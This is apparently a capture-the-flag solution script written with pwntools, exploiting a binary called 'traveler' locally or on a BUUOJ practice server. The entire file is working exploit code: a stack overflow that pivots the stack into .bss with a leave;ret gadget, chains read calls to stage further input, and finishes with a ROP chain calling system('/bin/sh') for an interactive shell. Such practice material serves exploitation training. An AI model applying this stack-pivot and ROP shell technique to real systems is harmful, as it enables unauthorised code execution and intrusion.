from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
#context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./traveler"
libc_path = "./libc-2.27.so"
ld_path = "/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so"

elf, rop = ELF(vuln_path), ROP(vuln_path)
#libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process(vuln_path)
    #io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("node4.buuoj.cn", 27597)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()


leave_ret = 0x401253
ret = 0x40101a
bss = 0x4040A0
call_system = 0x4011EC
pop_rdi = 0x04012c3
pop_rsi_r15 = 0x004012c1
read = elf.plt['read']
system = 0x0401090

io.sendafter("u?\n", b"a" * 0x20 + p64(bss) + p64(leave_ret))

payload = p64(bss + 0x600) + p64(pop_rsi_r15) + p64(bss + 0x28) + p64(0) + p64(read)
ddebug()
io.sendafter("in his life?\n", payload)

pay = p64(pop_rsi_r15) + p64(bss + 0x600) + p64(0) + p64(read) + p64(leave_ret)
io.send(pay)
# ROP to system
pay = b"/bin/sh\x00" + p64(pop_rdi) + p64(bss + 0x600) + p64(ret) + p64(system)
io.send(pay)

io.interactive()
